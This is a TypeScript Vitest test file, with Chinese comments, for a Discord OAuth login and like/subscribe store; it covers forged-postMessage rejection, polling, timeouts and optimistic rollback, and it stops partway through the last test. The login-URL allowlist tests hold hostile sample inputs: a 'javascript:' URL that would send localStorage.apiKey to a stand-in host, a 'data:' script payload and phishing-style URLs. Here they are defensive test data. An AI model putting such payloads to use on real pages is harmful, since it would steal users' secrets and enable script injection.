/**
 * workshop-social-store 测试（Phase 3 / P3b）
 *
 * 本 store 管的是**登录**与**乐观更新**，两者都是「时序对了才对」的东西，所以这里
 * 断言的全是时序与拒收:
 *
 * 1. **伪造的 postMessage 一律拒收** —— 回调页把消息广播给 `'*'`，任何页面都能照抄
 *    那个 `source` 常量再发一遍。真正防伪造的是 `state`（D19 双重验证）。
 * 2. **快路径命中后不再 poll** —— poll 是**单次消费**，多问一次会把结果吃掉又扔掉（O3）。
 * 3. **60 秒收场** —— 不能让「登录中」这个状态永远挂着。
 * 4. **过期 token 启动即静默登出** —— 否则用户看着自己的头像，点什么都 401（D20）。
 * 5. **乐观 → 校正 → 回滚** —— 服务端重数出来的 count 无条件覆盖本地推算（D23/O5）。
 * 6. **节流窗口内不发第二枪** —— 服务端零限流，这一层全靠我们自觉。
 *
 * 网络全程走 client 的 `setWorkshopFetch()` 注入缝，**不发任何真实请求**；
 * 弹窗与 postMessage 走 `setWorkshopSocialEnv()`，**不开真弹窗**。
 *
 * 🔴 真实 Discord OAuth（含服务器成员门槛）留给主人人工走 —— 助手不代操作账号登录。
 */
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { setActivePinia, createPinia } from 'pinia';
import type { WorkshopSocialMeta } from '@engine/workshop-types';
import {
  resetWorkshopClient,
  setWorkshopClock,
  setWorkshopFetch,
  WORKSHOP_API_BASE,
  type WorkshopResponseLike,
} from '../lib/workshop-client';
import {
  decodeJwtPayload,
  isAllowedLoginUrl,
  setWorkshopSocialEnv,
  useWorkshopSocialStore,
  WORKSHOP_AUTH_STORAGE_KEY,
  WORKSHOP_CALLBACK_SOURCE,
  WORKSHOP_LOGIN_POLL_INTERVAL_MS,
  WORKSHOP_LOGIN_TIMEOUT_MS,
  WORKSHOP_TOGGLE_THROTTLE_MS,
  type WorkshopPopupLike,
} from './workshop-social-store';

// ═══════════════════════════════════════════════════════════
// 环境替身
// ═══════════════════════════════════════════════════════════

const lsBacking = new Map<string, string>();
vi.stubGlobal('localStorage', {
  getItem: (k: string) => lsBacking.get(k) ?? null,
  setItem: (k: string, v: string) => void lsBacking.set(k, v),
  removeItem: (k: string) => void lsBacking.delete(k),
  clear: () => lsBacking.clear(),
  get length() {
    return lsBacking.size;
  },
  key: (i: number) => [...lsBacking.keys()][i] ?? null,
});

const PROJECT_ID = 'p-1';
const LOGIN_URL = `${WORKSHOP_API_BASE}/api/auth/login`;
const POLL_PREFIX = `${WORKSHOP_API_BASE}/api/auth/poll`;
const LIKE_URL = `${WORKSHOP_API_BASE}/api/projects/${PROJECT_ID}/like`;
const SUB_URL = `${WORKSHOP_API_BASE}/api/projects/${PROJECT_ID}/subscribe`;
const STATE = 'state-uuid-42';

function makeJwt(payload: Record<string, unknown>): string {
  const seg = (obj: unknown): string => {
    const bytes = new TextEncoder().encode(JSON.stringify(obj));
    let binary = '';
    for (const byte of bytes) binary += String.fromCharCode(byte);
    return btoa(binary).replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
  };
  return `${seg({ alg: 'HS256', typ: 'JWT' })}.${seg(payload)}.c2ln`;
}

/** 2100 年过期 —— 测试期内恒有效 */
const LIVE_TOKEN = makeJwt({
  userId: 'u-777',
  username: 'saki',
  globalName: '夜见哉川',
  avatar: 'hash',
  exp: 4_102_444_800,
});
/** 2001 年过期 —— 启动时必须被静默清掉 */
const DEAD_TOKEN = makeJwt({ userId: 'u-777', username: 'saki', exp: 1_000_000_000 });

// ── 网络：按 URL 前缀路由，未登记一律 404 ──
let routes: Array<
  [prefix: string, respond: () => WorkshopResponseLike | Promise<WorkshopResponseLike>]
> = [];
let sent: string[] = [];

function json(body: unknown): WorkshopResponseLike {
  return { ok: true, status: 200, text: async () => JSON.stringify(body) };
}

function installFetch(): void {
  setWorkshopFetch(async (url) => {
    sent.push(url);
    for (const [prefix, respond] of routes) {
      if (url.startsWith(prefix)) return respond();
    }
    return { ok: false, status: 404, statusText: 'Not Found', text: async () => 'not found' };
  });
}

function countOf(prefix: string): number {
  return sent.filter((u) => u.startsWith(prefix)).length;
}

// ── 宿主环境：弹窗 + postMessage ──
let popups: string[] = [];
let popupResult: WorkshopPopupLike | null = {};
let listeners: Array<(data: unknown) => void> = [];
let clockMs = 1_000_000;

function emitMessage(data: unknown): void {
  for (const fn of [...listeners]) fn(data);
}

/** 回调页真实会发的那条消息（上游 `endpoints/auth.ts:59-68`） */
function callbackMessage(over: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    type: 'oauth-success',
    source: WORKSHOP_CALLBACK_SOURCE,
    state: STATE,
    token: LIVE_TOKEN,
    user: { userId: 'u-777', username: 'saki', globalName: '夜见哉川', avatar: 'hash' },
    ...over,
  };
}

function meta(over: Partial<WorkshopSocialMeta> = {}): WorkshopSocialMeta {
  return {
    likesCount: 0,
    subscribesCount: 0,
    downloadsCount: 0,
    userLiked: false,
    userSubscribed: false,
    ...over,
  };
}

beforeEach(() => {
  setActivePinia(createPinia());
  lsBacking.clear();
  routes = [];
  sent = [];
  popups = [];
  popupResult = {};
  listeners = [];
  // ★ 必须是一个**真实量级**的 epoch 毫秒：JWT 的 `exp` 是秒，拿 1970 年的假时钟
  //   去比，任何 token 都算「还没过期」，过期分支就永远测不到。
  clockMs = 1_800_000_000_000;

  resetWorkshopClient();
  setWorkshopClock(() => clockMs);
  installFetch();
  setWorkshopSocialEnv({
    openPopup: (url) => {
      popups.push(url);
      return popupResult;
    },
    onMessage: (handler) => {
      listeners.push(handler);
      return () => {
        listeners = listeners.filter((fn) => fn !== handler);
      };
    },
    now: () => clockMs,
  });

  // 起飞端点默认成功；poll 默认未就绪（各用例按需覆盖）
  routes.push([
    LOGIN_URL,
    () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE }),
  ]);
  routes.push([POLL_PREFIX, () => json({ ready: false })]);
});

afterEach(() => {
  resetWorkshopClient();
  setWorkshopSocialEnv(undefined);
  vi.useRealTimers();
});

/** 让挂起的 Promise 链走完（无需推进定时器） */
async function flush(times = 4): Promise<void> {
  for (let i = 0; i < times; i += 1) await Promise.resolve();
}

// ═══════════════════════════════════════════════════════════
// 启动 / 持久化（D20）
// ═══════════════════════════════════════════════════════════

describe('init 与本地 token', () => {
  it('没有存过 token → 未登录，且不发任何请求', () => {
    const store = useWorkshopSocialStore();
    store.init();
    expect(store.isLoggedIn).toBe(false);
    expect(store.user).toBeNull();
    expect(sent).toHaveLength(0);
  });

  it('存了有效 token → 恢复登录态，用户信息本地解码（O1：不调 /api/auth/me）', () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    const store = useWorkshopSocialStore();
    store.init();

    expect(store.isLoggedIn).toBe(true);
    expect(store.user?.userId).toBe('u-777');
    expect(store.user?.globalName).toBe('夜见哉川');
    // ★ 一个请求都没发 —— 用户信息完全来自本地解码
    expect(sent).toHaveLength(0);
  });

  it('★ 过期 token → 启动即静默登出，并把 localStorage 里那条清掉（D20）', () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: DEAD_TOKEN }));
    const store = useWorkshopSocialStore();
    store.init();

    expect(store.isLoggedIn).toBe(false);
    expect(lsBacking.has(WORKSHOP_AUTH_STORAGE_KEY)).toBe(false);
    // 静默 = 不留一个「失败」状态在 UI 上（用户什么都没做）
    expect(store.loginPhase).toBe('idle');
    expect(store.loginError).toBeNull();
  });

  it('手改坏的 localStorage（非 JSON / 缺 token / 不是 JWT）一律当未登录，绝不抛', () => {
    for (const bad of ['{{{', '{}', '{"token":123}', '{"token":"not-a-jwt"}']) {
      lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, bad);
      setActivePinia(createPinia());
      const store = useWorkshopSocialStore();
      expect(() => store.init()).not.toThrow();
      expect(store.isLoggedIn).toBe(false);
    }
  });

  it('★ init 之后 client 才带得上身份 —— provider 注册的是取值方式，不是当时的值', async () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    const inits: Array<Record<string, string> | undefined> = [];
    setWorkshopFetch(async (_url, init) => {
      inits.push(init?.headers);
      return json({ liked: true, count: 1 });
    });

    const store = useWorkshopSocialStore();
    store.init();
    await store.toggleLike(PROJECT_ID);
    expect(inits[0]?.Authorization).toBe(`Bearer ${LIVE_TOKEN}`);
  });

  it('init 幂等（重复调用不重复恢复、不重复注册）', () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    const store = useWorkshopSocialStore();
    store.init();
    store.init();
    expect(store.isLoggedIn).toBe(true);
  });

  it('re-export 的 decodeJwtPayload 与 client 是同一个实现', () => {
    expect(decodeJwtPayload(LIVE_TOKEN)?.userId).toBe('u-777');
  });
});

// ═══════════════════════════════════════════════════════════
// 登录编排（D19 / O3）
// ═══════════════════════════════════════════════════════════

describe('login', () => {
  it('弹窗被拦（window.open 返 null）→ 立刻失败并说清怎么办，不进轮询', async () => {
    popupResult = null;
    const store = useWorkshopSocialStore();
    store.init();

    const out = await store.login();
    expect(out.status).toBe('failed');
    if (out.status === 'failed') expect(out.message).toContain('拦截');
    expect(store.loginPhase).toBe('failed');
    expect(countOf(POLL_PREFIX)).toBe(0);
  });

  it('起飞端点失败 → 不开弹窗，直接报错', async () => {
    routes = [[LOGIN_URL, () => ({ ok: false, status: 500, text: async () => '' })]];
    const store = useWorkshopSocialStore();
    store.init();

    const out = await store.login();
    expect(out.status).toBe('failed');
    expect(popups).toHaveLength(0);
  });

  it('★ postMessage 快路径命中 → 收下 token，且此后一发 poll 都不打（O3 单次消费）', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();

    const task = store.login();
    await vi.advanceTimersByTimeAsync(1); // 让 startLogin 兑现、监听挂上
    expect(popups).toHaveLength(1);

    emitMessage(callbackMessage());
    const out = await task;

    expect(out.status).toBe('success');
    expect(store.isLoggedIn).toBe(true);
    expect(store.user?.globalName).toBe('夜见哉川');
    expect(store.loginPhase).toBe('success');
    // token 落盘（只存 token，不存用户快照）
    expect(JSON.parse(lsBacking.get(WORKSHOP_AUTH_STORAGE_KEY) ?? '{}')).toEqual({
      token: LIVE_TOKEN,
    });

    // ★ 再等 3 个轮询周期：一发 poll 都不该出现
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS * 3);
    expect(countOf(POLL_PREFIX)).toBe(0);
    // 监听也已摘掉，不留全局残留
    expect(listeners).toHaveLength(0);
  });

  it('★ 伪造消息：source 不对 → 拒收（回调页广播给 *，谁都能照抄这个串）', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();

    let settled = false;
    const task = store.login().then((r) => {
      settled = true;
      return r;
    });
    await vi.advanceTimersByTimeAsync(1);

    emitMessage(callbackMessage({ source: 'evil-page', token: 'ATTACKER' }));
    await flush();
    expect(settled).toBe(false);
    expect(store.isLoggedIn).toBe(false);

    // 真的那条仍然收得下
    emitMessage(callbackMessage());
    expect((await task).status).toBe('success');
    expect(store.token).toBe(LIVE_TOKEN);
  });

  it('★ 伪造消息：state 不对 → 拒收（state 才是攻击者无从伪造的那一半）', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();

    let settled = false;
    const task = store.login().then((r) => {
      settled = true;
      return r;
    });
    await vi.advanceTimersByTimeAsync(1);

    emitMessage(callbackMessage({ state: 'state-uuid-伪造', token: 'ATTACKER' }));
    emitMessage(callbackMessage({ state: undefined, token: 'ATTACKER' }));
    emitMessage('一条裸字符串消息');
    emitMessage(null);
    await flush();
    expect(settled).toBe(false);
    expect(store.isLoggedIn).toBe(false);

    emitMessage(callbackMessage());
    expect((await task).status).toBe('success');
  });

  it('消息里没有 token（或是空串）同样拒收 —— 不让 UI 收下一个空身份', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();
    const task = store.login();
    await vi.advanceTimersByTimeAsync(1);

    emitMessage(callbackMessage({ token: '' }));
    emitMessage(callbackMessage({ token: 42 }));
    await flush();
    expect(store.isLoggedIn).toBe(false);

    emitMessage(callbackMessage());
    await task;
    expect(store.isLoggedIn).toBe(true);
  });

  it('轮询兜底：拿不到 postMessage 时，2 秒一发直到 ready', async () => {
    vi.useFakeTimers();
    let ready = false;
    routes = [
      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
      [
        POLL_PREFIX,
        () =>
          ready ? json({ ready: true, success: true, token: LIVE_TOKEN }) : json({ ready: false }),
      ],
    ];

    const store = useWorkshopSocialStore();
    store.init();
    const task = store.login();
    await vi.advanceTimersByTimeAsync(1);

    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS * 2);
    expect(countOf(POLL_PREFIX)).toBe(2);
    expect(store.isLoggedIn).toBe(false);

    ready = true;
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS);
    const out = await task;
    expect(out.status).toBe('success');
    expect(store.isLoggedIn).toBe(true);
  });

  it('★ 轮询报 success:false（多为 Discord 服务器门槛）→ 终局失败，message 原样给 UI', async () => {
    vi.useFakeTimers();
    routes = [
      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
      [POLL_PREFIX, () => json({ ready: true, success: false, message: '你不在允许的服务器中' })],
    ];

    const store = useWorkshopSocialStore();
    store.init();
    const task = store.login();
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS + 1);

    const out = await task;
    expect(out.status).toBe('failed');
    if (out.status === 'failed') expect(out.message).toBe('你不在允许的服务器中');
    expect(store.loginError).toBe('你不在允许的服务器中');
    expect(store.isLoggedIn).toBe(false);
  });

  it('轮询期间断网不把登录判死 —— 网络恢复后仍能成功', async () => {
    vi.useFakeTimers();
    let offline = true;
    routes = [
      [LOGIN_URL, () => json({ url: 'https://discord.com/oauth2/authorize', state: STATE })],
      [
        POLL_PREFIX,
        () => {
          if (offline) throw new Error('模拟断网');
          return json({ ready: true, success: true, token: LIVE_TOKEN });
        },
      ],
    ];

    const store = useWorkshopSocialStore();
    store.init();
    const task = store.login();
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS * 2 + 1);
    expect(store.isLoggedIn).toBe(false);

    offline = false;
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS);
    expect((await task).status).toBe('success');
  });

  it('★ 60 秒超时收场 —— 「登录中」不许永远挂着', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();

    const task = store.login();
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_TIMEOUT_MS + 10);
    const out = await task;

    expect(out.status).toBe('failed');
    if (out.status === 'failed') expect(out.message).toContain('超时');
    expect(store.isLoggedIn).toBe(false);
    // 收场后不再轮询、不再监听
    const pollsAtTimeout = countOf(POLL_PREFIX);
    await vi.advanceTimersByTimeAsync(WORKSHOP_LOGIN_POLL_INTERVAL_MS * 5);
    expect(countOf(POLL_PREFIX)).toBe(pollsAtTimeout);
    expect(listeners).toHaveLength(0);
  });

  it('★ 单飞：连点两下「登录」只起飞一次、只开一个弹窗', async () => {
    vi.useFakeTimers();
    const store = useWorkshopSocialStore();
    store.init();

    const a = store.login();
    const b = store.login();
    await vi.advanceTimersByTimeAsync(1);
    emitMessage(callbackMessage());

    expect((await a).status).toBe('success');
    expect((await b).status).toBe('success');
    expect(countOf(LOGIN_URL)).toBe(1);
    expect(popups).toHaveLength(1);
  });

  it('登录成功会清掉上一身份的覆盖层（旗标不跨身份，§3.3）', async () => {
    vi.useFakeTimers();
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    routes.push([LIKE_URL, () => json({ liked: true, count: 1 })]);

    const store = useWorkshopSocialStore();
    store.init();
    await store.toggleLike(PROJECT_ID);
    expect(store.socialOf(PROJECT_ID)).toBeDefined();

    const task = store.login();
    await vi.advanceTimersByTimeAsync(1);
    emitMessage(callbackMessage());
    await task;
    expect(store.socialOf(PROJECT_ID)).toBeUndefined();
  });
});

// ═══════════════════════════════════════════════════════════
// 登出（O4）
// ═══════════════════════════════════════════════════════════

describe('登录地址白名单（开弹窗前的那一刀）', () => {
  it('★ 非 https 一律拒 —— javascript: 弹窗会在与本源关联的上下文里执行', () => {
    expect(isAllowedLoginUrl('javascript:fetch("//evil.invalid?k="+localStorage.apiKey)')).toBe(
      false,
    );
    expect(isAllowedLoginUrl('data:text/html,<script>alert(1)</script>')).toBe(false);
    expect(isAllowedLoginUrl('http://discord.com/oauth2/authorize')).toBe(false);
  });

  it('★ 陌生域一律拒 —— 弹窗保留 opener，放进来就能 opener.location = 钓鱼页', () => {
    expect(isAllowedLoginUrl('https://evil.invalid/oauth2/authorize')).toBe(false);
    // 后缀像但不是：`notdiscord.com` 不能因为「以 discord.com 结尾」被放行
    expect(isAllowedLoginUrl('https://notdiscord.com/oauth2/authorize')).toBe(false);
    // 域名藏在别的位置也不算
    expect(isAllowedLoginUrl('https://evil.invalid/?x=discord.com')).toBe(false);
    expect(isAllowedLoginUrl('https://evil.invalid#discord.com')).toBe(false);
  });

  it('放行 Discord 授权页与工坊 worker（含子域）', () => {
    expect(isAllowedLoginUrl('https://discord.com/oauth2/authorize?client_id=1')).toBe(true);
    expect(isAllowedLoginUrl('https://canary.discord.com/oauth2/authorize')).toBe(true);
    expect(isAllowedLoginUrl(`${WORKSHOP_API_BASE}/api/auth/redirect`)).toBe(true);
  });

  it('畸形串 / 相对地址不许抛，直接拒', () => {
    expect(isAllowedLoginUrl('')).toBe(false);
    expect(isAllowedLoginUrl('/api/auth/login')).toBe(false);
    expect(isAllowedLoginUrl('discord.com/oauth2')).toBe(false);
  });

  it('★ 起飞端点给了个坏地址 → 一个弹窗都不许开', async () => {
    routes = routes.filter(([prefix]) => prefix !== LOGIN_URL);
    routes.push([LOGIN_URL, () => json({ url: 'https://evil.invalid/steal', state: STATE })]);
    const store = useWorkshopSocialStore();
    store.init();

    const out = await store.login();
    expect(out.status).toBe('failed');
    expect(popups).toHaveLength(0); // 关键断言：没开
    expect(store.isLoggedIn).toBe(false);
  });
});

describe('logout', () => {
  it('★ 一发请求都不出去（上游 logout 是纯 no-op），本地清干净', async () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    routes.push([LIKE_URL, () => json({ liked: true, count: 3 })]);

    const store = useWorkshopSocialStore();
    store.init();
    await store.toggleLike(PROJECT_ID);
    const before = sent.length;

    store.logout();

    expect(sent).toHaveLength(before); // ★ 零请求
    expect(store.isLoggedIn).toBe(false);
    expect(store.user).toBeNull();
    expect(lsBacking.has(WORKSHOP_AUTH_STORAGE_KEY)).toBe(false);
    // 覆盖层清空：上一个人的旗标不该留在屏幕上
    expect(store.socialOf(PROJECT_ID)).toBeUndefined();
  });

  it('登出后 client 不再带身份', async () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    const inits: Array<Record<string, string> | undefined> = [];
    setWorkshopFetch(async (_url, init) => {
      inits.push(init?.headers);
      return json({ liked: true, count: 1 });
    });

    const store = useWorkshopSocialStore();
    store.init();
    await store.toggleLike(PROJECT_ID);
    store.logout();
    // 未登录时 toggle 连请求都不发，所以这里只断言 header 历史与登录态
    const out = await store.toggleLike(PROJECT_ID);
    expect(out.status).toBe('unauthorized');
    expect(inits).toHaveLength(1);
  });
});

// ═══════════════════════════════════════════════════════════
// toggle：乐观 → 校正 → 回滚（D23）
// ═══════════════════════════════════════════════════════════

describe('toggleLike / toggleSubscribe', () => {
  function loggedIn() {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    const store = useWorkshopSocialStore();
    store.init();
    return store;
  }

  it('★ 未登录 → unauthorized，且一发请求都不出去', async () => {
    const store = useWorkshopSocialStore();
    store.init();

    const out = await store.toggleLike(PROJECT_ID);
    expect(out.status).toBe('unauthorized');
    expect(sent).toHaveLength(0);
    expect(store.socialOf(PROJECT_ID)).toBeUndefined();
  });

  it('★ 乐观 → 校正：响应里的 count 无条件覆盖本地推算的 +1（O5 零回读）', async () => {
    routes.push([LIKE_URL, () => json({ liked: true, count: 99 })]);
    const store = loggedIn();

    const out = await store.toggleLike(PROJECT_ID, meta({ likesCount: 5 }));
    expect(out.status).toBe('ok');
    // 本地推算是 6，服务端说 99 —— 服务端赢（翻转语义下本地随时会差一）
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(99);
    expect(store.socialOf(PROJECT_ID)?.userLiked).toBe(true);
  });

  it('响应里的旗标同样无条件覆盖（服务端说没赞就是没赞）', async () => {
    routes.push([LIKE_URL, () => json({ liked: false, count: 4 })]);
    const store = loggedIn();

    await store.toggleLike(PROJECT_ID, meta({ likesCount: 5, userLiked: false }));
    expect(store.socialOf(PROJECT_ID)?.userLiked).toBe(false);
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(4);
  });

  it('★ 在飞期间先看到乐观值（按钮当场有反馈）', async () => {
    let release: (() => void) | undefined;
    routes.push([
      LIKE_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          release = () => resolve(json({ liked: true, count: 99 }));
        }),
    ]);
    const store = loggedIn();

    const task = store.toggleLike(PROJECT_ID, meta({ likesCount: 5 }));
    await flush();
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(6); // 乐观 +1
    expect(store.isBusy(PROJECT_ID, 'like')).toBe(true);

    release?.();
    await task;
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(99); // 校正
    expect(store.isBusy(PROJECT_ID, 'like')).toBe(false);
  });

  it('★ 失败回滚：之前没有覆盖值的，回滚后必须**没有**覆盖值（不留凭空造的全 0）', async () => {
    routes.push([
      LIKE_URL,
      () => {
        throw new Error('模拟断网');
      },
    ]);
    const store = loggedIn();

    const out = await store.toggleLike(PROJECT_ID, meta({ likesCount: 5 }));
    expect(out.status).toBe('failed');
    expect(store.socialOf(PROJECT_ID)).toBeUndefined();
    // 列表响应那份仍然可见（§3.3 第二优先级）
    expect(store.socialOf(PROJECT_ID, meta({ likesCount: 5 }))?.likesCount).toBe(5);
  });

  it('失败回滚：之前有覆盖值的，回到操作前那一份', async () => {
    let fail = false;
    routes.push([
      LIKE_URL,
      () => {
        if (fail) throw new Error('模拟断网');
        return json({ liked: true, count: 10 });
      },
    ]);
    const store = loggedIn();

    await store.toggleLike(PROJECT_ID);
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(10);

    fail = true;
    clockMs += WORKSHOP_TOGGLE_THROTTLE_MS; // 越过节流窗口
    await store.toggleLike(PROJECT_ID);
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(10);
    expect(store.socialOf(PROJECT_ID)?.userLiked).toBe(true);
  });

  it('★ 401 → unauthorized，并退到未登录态（留着被拒的 token 只会让后续每次都失败）', async () => {
    routes.push([
      LIKE_URL,
      () => ({
        ok: false,
        status: 401,
        statusText: 'Unauthorized',
        text: async () => '{"error":"Unauthorized"}',
      }),
    ]);
    const store = loggedIn();

    const out = await store.toggleLike(PROJECT_ID);
    expect(out.status).toBe('unauthorized');
    expect(store.isLoggedIn).toBe(false);
    expect(lsBacking.has(WORKSHOP_AUTH_STORAGE_KEY)).toBe(false);
  });

  it('★ 节流窗口内的第二次点击不发第二枪（服务端零限流，全靠我们自觉）', async () => {
    routes.push([LIKE_URL, () => json({ liked: true, count: 1 })]);
    const store = loggedIn();

    await store.toggleLike(PROJECT_ID);
    const second = await store.toggleLike(PROJECT_ID);

    expect(second.status).toBe('skipped');
    if (second.status === 'skipped') expect(second.reason).toBe('throttled');
    expect(countOf(LIKE_URL)).toBe(1);

    // 窗口过了就放行
    clockMs += WORKSHOP_TOGGLE_THROTTLE_MS;
    const third = await store.toggleLike(PROJECT_ID);
    expect(third.status).toBe('ok');
    expect(countOf(LIKE_URL)).toBe(2);
  });

  it('在飞时的重复点击算 busy，同样不发第二枪', async () => {
    let release: (() => void) | undefined;
    routes.push([
      LIKE_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          release = () => resolve(json({ liked: true, count: 1 }));
        }),
    ]);
    const store = loggedIn();

    const first = store.toggleLike(PROJECT_ID);
    await flush();
    const second = await store.toggleLike(PROJECT_ID);
    expect(second.status).toBe('skipped');
    if (second.status === 'skipped') expect(second.reason).toBe('busy');

    release?.();
    await first;
    expect(countOf(LIKE_URL)).toBe(1);
  });

  it('★ 节流按（项目 × 动作）分开 —— 刚点完赞马上订阅不该被卡住', async () => {
    routes.push([LIKE_URL, () => json({ liked: true, count: 1 })]);
    routes.push([SUB_URL, () => json({ subscribed: true, count: 1 })]);
    const store = loggedIn();

    expect((await store.toggleLike(PROJECT_ID)).status).toBe('ok');
    expect((await store.toggleSubscribe(PROJECT_ID)).status).toBe('ok');
    expect(countOf(LIKE_URL)).toBe(1);
    expect(countOf(SUB_URL)).toBe(1);
  });

  it('订阅只动订阅那一对字段，点赞侧原样保留', async () => {
    routes.push([SUB_URL, () => json({ subscribed: true, count: 8 })]);
    const store = loggedIn();

    await store.toggleSubscribe(PROJECT_ID, meta({ likesCount: 5, userLiked: true }));
    const social = store.socialOf(PROJECT_ID);
    expect(social?.subscribesCount).toBe(8);
    expect(social?.userSubscribed).toBe(true);
    expect(social?.likesCount).toBe(5);
    expect(social?.userLiked).toBe(true);
  });

  // ── 并发：两个动作同时在飞 ──
  // 节流键刻意按（项目 × 动作）分开（见上一条），所以「点完赞马上点订阅」是**受支持的**
  // 路径 —— 两枪会同时在飞。校正/回滚都必须只动自己那一对字段，且要基于**落地时**的
  // 覆盖层，不能拿动作起飞时抓的那份快照整个盖回去（那会把对方的成果一起抹掉）。
  it('★ 并发：两个都成功，后落地的不许把先落地的成果重置回起飞前', async () => {
    let releaseLike: (() => void) | undefined;
    let releaseSub: (() => void) | undefined;
    routes.push([
      LIKE_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          releaseLike = () => resolve(json({ liked: true, count: 6 }));
        }),
    ]);
    routes.push([
      SUB_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          releaseSub = () => resolve(json({ subscribed: true, count: 3 }));
        }),
    ]);
    const store = loggedIn();

    const likeTask = store.toggleLike(PROJECT_ID, meta({ likesCount: 5 }));
    const subTask = store.toggleSubscribe(PROJECT_ID, meta({ likesCount: 5 }));
    await flush();

    releaseSub?.(); // 订阅先落地
    await subTask;
    releaseLike?.(); // 点赞后落地
    await likeTask;

    const social = store.socialOf(PROJECT_ID);
    expect(social?.likesCount).toBe(6);
    expect(social?.userLiked).toBe(true);
    // 订阅是先落地的那个，不该被后落地的点赞用陈旧快照重置回 0/false
    expect(social?.subscribesCount).toBe(3);
    expect(social?.userSubscribed).toBe(true);
  });

  it('★ 并发：点赞失败回滚不许连累订阅，也不许给订阅留下一个幻影赞', async () => {
    let failLike: (() => void) | undefined;
    let releaseSub: (() => void) | undefined;
    routes.push([
      LIKE_URL,
      () =>
        new Promise<WorkshopResponseLike>((_resolve, reject) => {
          failLike = () => reject(new Error('模拟断网'));
        }),
    ]);
    routes.push([
      SUB_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          releaseSub = () => resolve(json({ subscribed: true, count: 3 }));
        }),
    ]);
    const store = loggedIn();

    const likeTask = store.toggleLike(PROJECT_ID, meta({ likesCount: 5 }));
    const subTask = store.toggleSubscribe(PROJECT_ID, meta({ likesCount: 5 }));
    await flush();

    failLike?.();
    expect((await likeTask).status).toBe('failed');
    releaseSub?.();
    await subTask;

    const social = store.socialOf(PROJECT_ID);
    // 赞没成功 —— 覆盖层里不许留下服务端从没记过的那一个
    expect(social?.userLiked).toBe(false);
    expect(social?.likesCount).toBe(5);
    // 订阅成功了 —— 不许被点赞的回滚顺手清掉
    expect(social?.userSubscribed).toBe(true);
    expect(social?.subscribesCount).toBe(3);
  });

  it('取消点赞时乐观计数不许算成负数', async () => {
    let release: (() => void) | undefined;
    routes.push([
      LIKE_URL,
      () =>
        new Promise<WorkshopResponseLike>((resolve) => {
          release = () => resolve(json({ liked: false, count: 0 }));
        }),
    ]);
    const store = loggedIn();

    const task = store.toggleLike(PROJECT_ID, meta({ likesCount: 0, userLiked: true }));
    await flush();
    expect(store.socialOf(PROJECT_ID)?.likesCount).toBe(0);
    release?.();
    await task;
  });

  it('空 id 直接失败，不发请求', async () => {
    const store = loggedIn();
    const out = await store.toggleLike('   ');
    expect(out.status).toBe('failed');
    expect(sent).toHaveLength(0);
  });
});

// ═══════════════════════════════════════════════════════════
// 显示优先级（§3.3）
// ═══════════════════════════════════════════════════════════

describe('socialOf 的读取规则', () => {
  it('没有覆盖层时用本次响应那份；两者都没有 → undefined（UI 不编数字）', () => {
    const store = useWorkshopSocialStore();
    store.init();
    expect(store.socialOf(PROJECT_ID)).toBeUndefined();
    expect(store.socialOf(PROJECT_ID, meta({ likesCount: 7 }))?.likesCount).toBe(7);
  });

  it('★ 覆盖层优先于响应 —— 120 秒的列表缓存不许把刚点完的赞盖回去', async () => {
    lsBacking.set(WORKSHOP_AUTH_STORAGE_KEY, JSON.stringify({ token: LIVE_TOKEN }));
    routes.push([LIKE_URL, () => json({ liked: true, count: 12 })]);
    const store = useWorkshopSocialStore();
    store.init();

    await store.toggleLike(PROJECT_ID, meta({ likesCount: 11 }));
    // 列表缓存里还是点赞前的旧值，但显示值必须是覆盖层那个
